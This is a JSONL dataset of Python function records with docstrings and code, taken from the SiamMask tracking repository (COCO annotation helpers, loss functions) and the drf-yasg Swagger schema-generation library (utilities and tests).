{"docstring": "'''\nGet img ids that satisfy given filter conditions.\n:param imgIds (int array) : get imgs for given ids\n:param catIds (int array) : get imgs with all given cats\n:return: ids (int array)  : integer array of img ids\n'''\n", "func_signal": "def getImgIds(self, imgIds=[], catIds=[]):\n", "code": "imgIds = imgIds if _isArrayLike(imgIds) else [imgIds]\ncatIds = catIds if _isArrayLike(catIds) else [catIds]\n\nif len(imgIds) == len(catIds) == 0:\n    ids = self.imgs.keys()\nelse:\n    ids = set(imgIds)\n    for i, catId in enumerate(catIds):\n        if i == 0 and len(ids) == 0:\n            ids = set(self.catToImgs[catId])\n        else:\n            ids &= set(self.catToImgs[catId])\nreturn list(ids)", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nConvert result data from a numpy array [Nx7] where each row contains {imageID,x1,y1,w,h,score,class}\n:param  data (numpy.ndarray)\n:return: annotations (python nested list)\n\"\"\"\n", "func_signal": "def loadNumpyAnnotations(self, data):\n", "code": "print('Converting ndarray to lists...')\nassert(type(data) == np.ndarray)\nprint(data.shape)\nassert(data.shape[1] == 7)\nN = data.shape[0]\nann = []\nfor i in range(N):\n    if i % 1000000 == 0:\n        print('{}/{}'.format(i,N))\n    ann += [{\n        'image_id'  : int(data[i, 0]),\n        'bbox'  : [ data[i, 1], data[i, 2], data[i, 3], data[i, 4] ],\n        'score' : data[i, 5],\n        'category_id': int(data[i, 6]),\n        }]\nreturn ann", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nCall in a loop to create terminal progress bar\n@params:\n    iteration   - Required  : current iteration (Int)\n    total       - Required  : total iterations (Int)\n    prefix      - Optional  : prefix string (Str)\n    suffix      - Optional  : suffix string (Str)\n    decimals    - Optional  : positive number of decimals in percent complete (Int)\n    barLength   - Optional  : character length of bar (Int)\n\"\"\"\n", "func_signal": "def printProgress(iteration, total, prefix='', suffix='', decimals=1, barLength=100):\n", "code": "formatStr       = \"{0:.\" + str(decimals) + \"f}\"\npercents        = formatStr.format(100 * (iteration / float(total)))\nfilledLength    = int(round(barLength * iteration / float(total)))\nbar             = '' * filledLength + '-' * (barLength - filledLength)\nsys.stdout.write('\\r%s |%s| %s%s %s' % (prefix, bar, percents, '%', suffix)),\nif iteration == total:\n    sys.stdout.write('\\x1b[2K\\r')\nsys.stdout.flush()", "path": "SiamMask/data/coco/par_crop.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nConvert annotation which can be polygons, uncompressed RLE, or RLE to binary mask.\n:return: binary mask (numpy 2D array)\n\"\"\"\n", "func_signal": "def annToMask(self, ann):\n", "code": "rle = self.annToRLE(ann)\nm = maskUtils.decode(rle)\nreturn m", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nConvert annotation which can be polygons, uncompressed RLE to RLE.\n:return: binary mask (numpy 2D array)\n\"\"\"\n", "func_signal": "def annToRLE(self, ann):\n", "code": "t = self.imgs[ann['image_id']]\nh, w = t['height'], t['width']\nsegm = ann['segmentation']\nif type(segm) == list:\n    # polygon -- a single object might consist of multiple parts\n    # we merge all parts into one mask rle code\n    rles = maskUtils.frPyObjects(segm, h, w)\n    rle = maskUtils.merge(rles)\nelif type(segm['counts']) == list:\n    # uncompressed RLE\n    rle = maskUtils.frPyObjects(segm, h, w)\nelse:\n    # rle\n    rle = ann['segmentation']\nreturn rle", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nfiltering parameters. default skips that filter.\n:param catNms (str array)  : get cats for given cat names\n:param supNms (str array)  : get cats for given supercategory names\n:param catIds (int array)  : get cats for given cat ids\n:return: ids (int array)   : integer array of cat ids\n\"\"\"\n", "func_signal": "def getCatIds(self, catNms=[], supNms=[], catIds=[]):\n", "code": "catNms = catNms if _isArrayLike(catNms) else [catNms]\nsupNms = supNms if _isArrayLike(supNms) else [supNms]\ncatIds = catIds if _isArrayLike(catIds) else [catIds]\n\nif len(catNms) == len(supNms) == len(catIds) == 0:\n    cats = self.dataset['categories']\nelse:\n    cats = self.dataset['categories']\n    cats = cats if len(catNms) == 0 else [cat for cat in cats if cat['name']          in catNms]\n    cats = cats if len(supNms) == 0 else [cat for cat in cats if cat['supercategory'] in supNms]\n    cats = cats if len(catIds) == 0 else [cat for cat in cats if cat['id']            in catIds]\nids = [cat['id'] for cat in cats]\nreturn ids", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\n:param pred_loc: [b, 4k, h, w]\n:param label_loc: [b, 4k, h, w]\n:param loss_weight:  [b, k, h, w]\n:return: loc loss value\n\"\"\"\n", "func_signal": "def weight_l1_loss(pred_loc, label_loc, loss_weight):\n", "code": "b, _, sh, sw = pred_loc.size()\npred_loc = pred_loc.view(b, 4, -1, sh, sw)\ndiff = (pred_loc - label_loc).abs()\ndiff = diff.sum(dim=1).view(b, -1, sh, sw)\nloss = diff * loss_weight\nreturn loss.sum().div(b)", "path": "SiamMask/models/siammask_sharp.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "# cx,cy,w,h\n", "func_signal": "def set_all_anchors(self, image_center, size):\n", "code": "if not self.anchor.generate_all_anchors(image_center, size):\n    return\nall_anchors = self.anchor.all_anchors[1]  # cx, cy, w, h\nself.all_anchors = torch.from_numpy(all_anchors).float().cuda()\nself.all_anchors = [self.all_anchors[i] for i in range(4)]", "path": "SiamMask/models/siammask_sharp.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nArgs:\n    path(str): path to result\n    tracker_name(list): name of tracker\n\"\"\"\n", "func_signal": "def load_tracker(self, path, tracker_names=None, store=True):\n", "code": "if not tracker_names:\n    tracker_names = [x.split('/')[-1] for x in glob(path)\n            if os.path.isdir(x)]\nif isinstance(tracker_names, str):\n    tracker_names = [tracker_names]\nfor name in tracker_names:\n    traj_file = os.path.join(path, name, self.name+'.txt')\n    if os.path.exists(traj_file):\n        with open(traj_file, 'r') as f :\n            pred_traj = [list(map(float, x.strip().split(',')))\n                    for x in f.readlines()]\n        if len(pred_traj) != len(self.gt_traj):\n            print(name, len(pred_traj), len(self.gt_traj), self.name)\n        if store:\n            self.pred_trajs[name] = pred_traj\n        else:\n            return pred_traj\n    else:\n        print(traj_file)\nself.tracker_names = list(self.pred_trajs.keys())", "path": "SiamMask/utils/pysot/datasets/video.py", "commit_date": "2019-03-04 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying img\n:return: imgs (object array) : loaded img objects\n\"\"\"\n", "func_signal": "def loadImgs(self, ids=[]):\n", "code": "if _isArrayLike(ids):\n    return [self.imgs[id] for id in ids]\nelif type(ids) == int:\n    return [self.imgs[ids]]", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nDisplay the specified annotations.\n:param anns (array of object): annotations to display\n:return: None\n\"\"\"\n", "func_signal": "def showAnns(self, anns):\n", "code": "if len(anns) == 0:\n    return 0\nif 'segmentation' in anns[0] or 'keypoints' in anns[0]:\n    datasetType = 'instances'\nelif 'caption' in anns[0]:\n    datasetType = 'captions'\nelse:\n    raise Exception('datasetType not supported')\nif datasetType == 'instances':\n    ax = plt.gca()\n    ax.set_autoscale_on(False)\n    polygons = []\n    color = []\n    for ann in anns:\n        c = (np.random.random((1, 3))*0.6+0.4).tolist()[0]\n        if 'segmentation' in ann:\n            if type(ann['segmentation']) == list:\n                # polygon\n                for seg in ann['segmentation']:\n                    poly = np.array(seg).reshape((int(len(seg)/2), 2))\n                    polygons.append(Polygon(poly))\n                    color.append(c)\n            else:\n                # mask\n                t = self.imgs[ann['image_id']]\n                if type(ann['segmentation']['counts']) == list:\n                    rle = maskUtils.frPyObjects([ann['segmentation']], t['height'], t['width'])\n                else:\n                    rle = [ann['segmentation']]\n                m = maskUtils.decode(rle)\n                img = np.ones( (m.shape[0], m.shape[1], 3) )\n                if ann['iscrowd'] == 1:\n                    color_mask = np.array([2.0,166.0,101.0])/255\n                if ann['iscrowd'] == 0:\n                    color_mask = np.random.random((1, 3)).tolist()[0]\n                for i in range(3):\n                    img[:,:,i] = color_mask[i]\n                ax.imshow(np.dstack( (img, m*0.5) ))\n        if 'keypoints' in ann and type(ann['keypoints']) == list:\n            # turn skeleton into zero-based index\n            sks = np.array(self.loadCats(ann['category_id'])[0]['skeleton'])-1\n            kp = np.array(ann['keypoints'])\n            x = kp[0::3]\n            y = kp[1::3]\n            v = kp[2::3]\n            for sk in sks:\n                if np.all(v[sk]>0):\n                    plt.plot(x[sk],y[sk], linewidth=3, color=c)\n            plt.plot(x[v>0], y[v>0],'o',markersize=8, markerfacecolor=c, markeredgecolor='k',markeredgewidth=2)\n            plt.plot(x[v>1], y[v>1],'o',markersize=8, markerfacecolor=c, markeredgecolor=c, markeredgewidth=2)\n    p = PatchCollection(polygons, facecolor=color, linewidths=0, alpha=0.4)\n    ax.add_collection(p)\n    p = PatchCollection(polygons, facecolor='none', edgecolors=color, linewidths=2)\n    ax.add_collection(p)\nelif datasetType == 'captions':\n    for ann in anns:\n        print(ann['caption'])", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nLoad result file and return a result api object.\n:param   resFile (str)     : file name of result file\n:return: res (obj)         : result api object\n\"\"\"\n", "func_signal": "def loadRes(self, resFile):\n", "code": "res = COCO()\nres.dataset['images'] = [img for img in self.dataset['images']]\n\nprint('Loading and preparing results...')\ntic = time.time()\n#if type(resFile) == str or type(resFile) == unicode:\nif type(resFile) == str:\n    anns = json.load(open(resFile))\nelif type(resFile) == np.ndarray:\n    anns = self.loadNumpyAnnotations(resFile)\nelse:\n    anns = resFile\nassert type(anns) == list, 'results in not an array of objects'\nannsImgIds = [ann['image_id'] for ann in anns]\nassert set(annsImgIds) == (set(annsImgIds) & set(self.getImgIds())), \\\n       'Results do not correspond to current coco set'\nif 'caption' in anns[0]:\n    imgIds = set([img['id'] for img in res.dataset['images']]) & set([ann['image_id'] for ann in anns])\n    res.dataset['images'] = [img for img in res.dataset['images'] if img['id'] in imgIds]\n    for id, ann in enumerate(anns):\n        ann['id'] = id+1\nelif 'bbox' in anns[0] and not anns[0]['bbox'] == []:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        bb = ann['bbox']\n        x1, x2, y1, y2 = [bb[0], bb[0]+bb[2], bb[1], bb[1]+bb[3]]\n        if not 'segmentation' in ann:\n            ann['segmentation'] = [[x1, y1, x1, y2, x2, y2, x2, y1]]\n        ann['area'] = bb[2]*bb[3]\n        ann['id'] = id+1\n        ann['iscrowd'] = 0\nelif 'segmentation' in anns[0]:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        # now only support compressed RLE format as segmentation results\n        ann['area'] = maskUtils.area(ann['segmentation'])\n        if not 'bbox' in ann:\n            ann['bbox'] = maskUtils.toBbox(ann['segmentation'])\n        ann['id'] = id+1\n        ann['iscrowd'] = 0\nelif 'keypoints' in anns[0]:\n    res.dataset['categories'] = copy.deepcopy(self.dataset['categories'])\n    for id, ann in enumerate(anns):\n        s = ann['keypoints']\n        x = s[0::3]\n        y = s[1::3]\n        x0,x1,y0,y1 = np.min(x), np.max(x), np.min(y), np.max(y)\n        ann['area'] = (x1-x0)*(y1-y0)\n        ann['id'] = id + 1\n        ann['bbox'] = [x0,y0,x1-x0,y1-y0]\nprint('DONE (t={:0.2f}s)'.format(time.time()- tic))\n\nres.dataset['annotations'] = anns\nres.createIndex()\nreturn res", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nPrint information about the annotation file.\n:return:\n\"\"\"\n", "func_signal": "def info(self):\n", "code": "for key, value in self.dataset['info'].items():\n    print('{}: {}'.format(key, value))", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nConstructor of Microsoft COCO helper class for reading and visualizing annotations.\n:param annotation_file (str): location of annotation file\n:param image_folder (str): location to the folder that hosts images.\n:return:\n\"\"\"\n# load dataset\n", "func_signal": "def __init__(self, annotation_file=None):\n", "code": "self.dataset,self.anns,self.cats,self.imgs = dict(),dict(),dict(),dict()\nself.imgToAnns, self.catToImgs = defaultdict(list), defaultdict(list)\nif not annotation_file == None:\n    print('loading annotations into memory...')\n    tic = time.time()\n    dataset = json.load(open(annotation_file, 'r'))\n    assert type(dataset)==dict, 'annotation file format {} not supported'.format(type(dataset))\n    print('Done (t={:0.2f}s)'.format(time.time()- tic))\n    self.dataset = dataset\n    self.createIndex()", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nLoad cats with the specified ids.\n:param ids (int array)       : integer ids specifying cats\n:return: cats (object array) : loaded cat objects\n\"\"\"\n", "func_signal": "def loadCats(self, ids=[]):\n", "code": "if _isArrayLike(ids):\n    return [self.cats[id] for id in ids]\nelif type(ids) == int:\n    return [self.cats[ids]]", "path": "SiamMask/data/coco/pycocotools/coco.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "\"\"\"\nrun network\n\"\"\"\n", "func_signal": "def run(self, template, search, softmax=False):\n", "code": "template_feature = self.feature_extractor(template)\nfeature, search_feature = self.features.forward_all(search)\nrpn_pred_cls, rpn_pred_loc = self.rpn(template_feature, search_feature)\ncorr_feature = self.mask_model.mask.forward_corr(template_feature, search_feature)  # (b, 256, w, h)\nrpn_pred_mask = self.refine_model(feature, corr_feature)\n\nif softmax:\n    rpn_pred_cls = self.softmax(rpn_pred_cls)\nreturn rpn_pred_cls, rpn_pred_loc, rpn_pred_mask, template_feature, search_feature", "path": "SiamMask/models/siammask_sharp.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "foolwood/SiamMask", "stars": 3439, "license": "mit", "language": "python", "size": 7080}
{"docstring": "# this view with description override should show up in the schema ...\n", "func_signal": "def test_url_order():\n", "code": "@swagger_auto_schema(method='get', operation_description=\"description override\")\n@api_view()\ndef test_override(request, pk=None):\n    return Response({\"message\": \"Hello, world!\"})\n\n# ... instead of this view which appears later in the url patterns\n@api_view()\ndef test_view(request, pk=None):\n    return Response({\"message\": \"Hello, world!\"})\n\npatterns = [\n    path('test/', test_override),\n    path('test/', test_view),\n]\n\ngenerator = OpenAPISchemaGenerator(\n    info=openapi.Info(title=\"Test generator\", default_version=\"v1\"),\n    version=\"v2\",\n    url='',\n    patterns=patterns\n)\n\n# description override is successful\nswagger = generator.get_schema(None, True)\nassert swagger['paths']['/test/']['get']['description'] == 'description override'\n\n# get_endpoints only includes one endpoint\nendpoints = generator.get_endpoints(None)\nassert len(endpoints['/test/'][1]) == 1", "path": "drf-yasg/tests/test_schema_generator.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "# freaking DRF... TODO: remove when dropping support for DRF 3.8\n", "func_signal": "def _basename_or_base_name(basename):\n", "code": "if 'basename' in get_func_args(routers.BaseRouter.register):\n    return {'basename': basename}\nelse:\n    return {'base_name': basename}", "path": "drf-yasg/tests/test_schema_generator.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Transform a list of :class:`.Parameter` objects into an ``OrderedDict`` keyed on the ``(name, in_)`` tuple of\neach parameter.\n\nRaises an ``AssertionError`` if `parameters` contains duplicate parameters (by their name + in combination).\n\n:param list[drf_yasg.openapi.Parameter] parameters: the list of parameters\n:return: `parameters` keyed by ``(name, in_)``\n:rtype: dict[(str,str),drf_yasg.openapi.Parameter]\n\"\"\"\n", "func_signal": "def param_list_to_odict(parameters):\n", "code": "result = OrderedDict(((param.name, param.in_), param) for param in parameters)\nassert len(result) == len(parameters), \"duplicate Parameters found\"\nreturn result", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"\nDecorates the method of a serializers.SerializerMethodField\nto hint as to how Swagger should be generated for this field.\n\n:param serializer_or_field: ``Serializer``/``Field`` class or instance\n:return:\n\"\"\"\n\n", "func_signal": "def swagger_serializer_method(serializer_or_field):\n", "code": "def decorator(serializer_method):\n    # stash the serializer for SerializerMethodFieldInspector to find\n    serializer_method._swagger_serializer = serializer_or_field\n    return serializer_method\n\nreturn decorator", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Force `serializer` into a ``Serializer`` instance. If it is not a ``Serializer`` class or instance, raises\nan assertion error.\n\n:param serializer: serializer class or instance\n:type serializer: serializers.BaseSerializer or type[serializers.BaseSerializer]\n:return: serializer instance\n:rtype: serializers.BaseSerializer\n\"\"\"\n", "func_signal": "def force_serializer_instance(serializer):\n", "code": "if inspect.isclass(serializer):\n    assert issubclass(serializer, serializers.BaseSerializer), \"Serializer required, not %s\" % serializer.__name__\n    return serializer()\n\nassert isinstance(serializer, serializers.BaseSerializer), \\\n    \"Serializer class or instance required, not %s\" % type(serializer).__name__\nreturn serializer", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Convert a python value related to a field (default, choices, etc.) into its OpenAPI-compatible representation.\n\n:param serializers.Field field: field associated with the value\n:param object value: value\n:return: the converted value\n\"\"\"\n", "func_signal": "def field_value_to_representation(field, value):\n", "code": "value = field.to_representation(value)\nif isinstance(value, Decimal):\n    if decimal_as_float(field):\n        value = float(value)\n    else:\n        value = str(value)\n\n# JSON roundtrip ensures that the value is valid JSON;\n# for example, sets and tuples get transformed into lists\nreturn json.loads(json.dumps(value, cls=encoders.JSONEncoder))", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Extract ``consumes`` MIME types from a list of parser classes.\n\n:param list parser_classes: parser classes\n:type parser_classes: list[rest_framework.parsers.BaseParser or type[rest_framework.parsers.BaseParser]]\n:return: MIME types for ``consumes``\n:rtype: list[str]\n\"\"\"\n", "func_signal": "def get_consumes(parser_classes):\n", "code": "parser_classes = get_object_classes(parser_classes)\nparser_classes = [pc for pc in parser_classes if not issubclass(pc, FileUploadParser)]\nmedia_types = [parser.media_type for parser in parser_classes or []]\nnon_form_media_types = [encoding for encoding in media_types if not is_form_media_type(encoding)]\n# Because swagger Parameter objects don't support complex data types (nested objects, arrays),\n# we can't use those unless we are sure the view *only* accepts form data\n# This means that a view won't support file upload in swagger unless it explicitly\n# sets its parser classes to include only form parsers\nif len(non_form_media_types) == 0:\n    return media_types\n\n# If the form accepts both form data and another type, like json (which is the default config),\n# we will render its input as a Schema and thus it file parameters will be read-only\nreturn non_form_media_types", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Run pytest and return the exitcode.\n\nIt translates some of Django's test command option to pytest's.\n\"\"\"\n", "func_signal": "def run_tests(self, test_labels):\n", "code": "import pytest\n\nargv = []\nif self.verbosity == 0:\n    argv.append('--quiet')\nif self.verbosity == 2:\n    argv.append('--verbose')\nif self.verbosity == 3:\n    argv.append('-vv')\nif self.failfast:\n    argv.append('--exitfirst')\nif self.keepdb:\n    argv.append('--reuse-db')\n\nargv.extend(test_labels)\nos.chdir('..')\nreturn pytest.main(argv)", "path": "drf-yasg/testproj/testproj/runner.py", "commit_date": "2017-12-02 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Get serializer's ref_name (or None for ModelSerializer if it is named 'NestedSerializer')\n\n:param serializer: Serializer instance\n:return: Serializer's ``ref_name`` or ``None`` for inline serializer\n:rtype: str or None\n\"\"\"\n", "func_signal": "def get_serializer_ref_name(serializer):\n", "code": "serializer_meta = getattr(serializer, 'Meta', None)\nserializer_name = type(serializer).__name__\nif hasattr(serializer_meta, 'ref_name'):\n    ref_name = serializer_meta.ref_name\nelif serializer_name == 'NestedSerializer' and isinstance(serializer, serializers.ModelSerializer):\n    logger.debug(\"Forcing inline output for ModelSerializer named 'NestedSerializer':\\n\" + str(serializer))\n    ref_name = None\nelse:\n    ref_name = serializer_name\n    if ref_name.endswith('Serializer'):\n        ref_name = ref_name[:-len('Serializer')]\nreturn ref_name", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Given a list of instances or class objects, return the list of their classes.\n\n:param classes_or_instances: mixed list to parse\n:type classes_or_instances: list[type or object]\n:param expected_base_class: if given, only subclasses or instances of this type will be returned\n:type expected_base_class: type\n:return: list of classes\n:rtype: list\n\"\"\"\n", "func_signal": "def get_object_classes(classes_or_instances, expected_base_class=None):\n", "code": "classes_or_instances = classes_or_instances or []\nresult = []\nfor obj in classes_or_instances:\n    if inspect.isclass(obj):\n        if not expected_base_class or issubclass(obj, expected_base_class):\n            result.append(obj)\n    else:\n        if not expected_base_class or isinstance(obj, expected_base_class):\n            result.append(type(obj))\n\nreturn result", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Check if the given path/method appears to represent a list view (as opposed to a detail/instance view).\n\n:param str path: view path\n:param str method: http method\n:param APIView view: target view\n:rtype: bool\n\"\"\"\n# for ViewSets, it could be the default 'list' action, or an @action(detail=False)\n", "func_signal": "def is_list_view(path, method, view):\n", "code": "action = getattr(view, 'action', '')\nmethod = getattr(view, action, None) or method\ndetail = getattr(method, 'detail', None)\nsuffix = getattr(view, 'suffix', None)\nif action in ('list', 'create') or detail is False or suffix == 'List':\n    return True\n\nif action in ('retrieve', 'update', 'partial_update', 'destroy') or detail is True or suffix == 'Instance':\n    # a detail action is surely not a list route\n    return False\n\nif isinstance(view, ListModelMixin):\n    return True\n\n# for GenericAPIView, if it's a detail view it can't also be a list view\nif isinstance(view, (RetrieveModelMixin, UpdateModelMixin, DestroyModelMixin)):\n    return False\n\n# if the last component in the path is parameterized it's probably not a list view\npath_components = path.strip('/').split('/')\nif path_components and '{' in path_components[-1]:\n    return False\n\n# otherwise assume it's a list view\nreturn True", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Given a ``Serializer`` class or intance, return the ``Serializer`` class. If `serializer` is not a ``Serializer``\nclass or instance, raises an assertion error.\n\n:param serializer: serializer class or instance, or ``None``\n:return: serializer class\n:rtype: type[serializers.BaseSerializer]\n\"\"\"\n", "func_signal": "def get_serializer_class(serializer):\n", "code": "if serializer is None:\n    return None\n\nif inspect.isclass(serializer):\n    assert issubclass(serializer, serializers.BaseSerializer), \"Serializer required, not %s\" % serializer.__name__\n    return serializer\n\nassert isinstance(serializer, serializers.BaseSerializer), \\\n    \"Serializer class or instance required, not %s\" % type(serializer).__name__\nreturn type(serializer)", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "# noinspection PyTypeChecker\n", "func_signal": "def test_invalid_schema_fails(codec_json, mock_schema_request):\n", "code": "bad_generator = OpenAPISchemaGenerator(\n    info=openapi.Info(\n        title=\"Test generator\", default_version=\"v1\",\n        contact=openapi.Contact(name=69, email=[])\n    ),\n    version=\"v2\",\n)\n\nswagger = bad_generator.get_schema(mock_schema_request, True)\nwith pytest.raises(codecs.SwaggerValidationError):\n    codec_json.encode(swagger)", "path": "drf-yasg/tests/test_schema_generator.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Merge `overrides` into `parameters`. This is the same as appending `overrides` to `parameters`, but any element\nof `parameters` whose ``(name, in_)`` tuple collides with an element in `overrides` is replaced by it.\n\nRaises an ``AssertionError`` if either list contains duplicate parameters.\n\n:param list[drf_yasg.openapi.Parameter] parameters: initial parameters\n:param list[drf_yasg.openapi.Parameter] overrides: overriding parameters\n:return: merged list\n:rtype: list[drf_yasg.openapi.Parameter]\n\"\"\"\n", "func_signal": "def merge_params(parameters, overrides):\n", "code": "parameters = param_list_to_odict(parameters)\nparameters.update(param_list_to_odict(overrides))\nreturn list(parameters.values())", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Returns true if ``field`` is a django-rest-framework DecimalField and its ``coerce_to_string`` attribute or the\n``COERCE_DECIMAL_TO_STRING`` setting is set to ``False``.\n\n:rtype: bool\n\"\"\"\n", "func_signal": "def decimal_as_float(field):\n", "code": "if isinstance(field, serializers.DecimalField) or isinstance(field, models.DecimalField):\n    return not getattr(field, 'coerce_to_string', rest_framework_settings.COERCE_DECIMAL_TO_STRING)\nreturn False", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"user_detail fbv docstring\"\"\"\n", "func_signal": "def user_detail(request, pk):\n", "code": "user = get_object_or_404(User.objects, pk=pk)\nserializer = UserSerializerrr(user)\nreturn Response(serializer.data)", "path": "drf-yasg/testproj/users/views.py", "commit_date": "2018-12-23 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"Remove ``None`` values from tuples, lists or dictionaries. Return other objects as-is.\n\n:param obj: the object\n:return: collection with ``None`` values removed\n\"\"\"\n", "func_signal": "def filter_none(obj):\n", "code": "if obj is None:\n    return None\nnew_obj = None\nif isinstance(obj, dict):\n    new_obj = type(obj)((k, v) for k, v in obj.items() if k is not None and v is not None)\nif isinstance(obj, (list, tuple)):\n    new_obj = type(obj)(v for v in obj if v is not None)\nif new_obj is not None and len(new_obj) != len(obj):\n    return new_obj  # pragma: no cover\nreturn obj", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
{"docstring": "\"\"\"\nForce `s` into a ``str`` instance.\n\nFix for https://github.com/axnsan12/drf-yasg/issues/159\n\"\"\"\n", "func_signal": "def force_real_str(s, encoding='utf-8', strings_only=False, errors='strict'):\n", "code": "if s is not None:\n    s = force_str(s, encoding, strings_only, errors)\n    if type(s) != str:\n        s = '' + s\n\n    # Remove common indentation to get the correct Markdown rendering\n    s = textwrap.dedent(s)\n\nreturn s", "path": "drf-yasg/src/drf_yasg/utils.py", "commit_date": "2020-10-25 00:00:00", "repo_name": "axnsan12/drf-yasg", "stars": 3291, "license": "other", "language": "python", "size": 23232}
